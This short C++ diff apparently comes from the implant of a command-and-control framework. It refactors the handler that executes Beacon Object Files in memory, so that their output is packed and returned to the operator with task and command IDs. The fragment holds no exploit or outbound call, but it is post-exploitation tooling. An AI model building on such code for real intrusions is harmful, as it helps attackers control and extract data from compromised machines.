@@ -279,14 +279,15 @@ void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	BYTE* args     = inPacker->UnpackBytes(&argsSize);
 	ULONG taskId   = inPacker->Unpack32();
 
-	ULONG outputSize = 0;
-	CHAR* output = ObjectExecute((int*)&outputSize, (CHAR*)entry, bof, bofSize, args, argsSize);
+	Packer* bofPacker = ObjectExecute(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
+	if (bofPacker->GetDataSize() > 8) {
+		outPacker->PackFlatBytes(bofPacker->GetData(), bofPacker->GetDataSize());
+	}
 
 	outPacker->Pack32(taskId);
 	outPacker->Pack32(commandId);
-	outPacker->PackBytes((PBYTE)output, outputSize);
 
-	MemFreeLocal((LPVOID*)&output, outputSize);
+	bofPacker->Clear();
 }
 
 void Commander::CmdJobsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
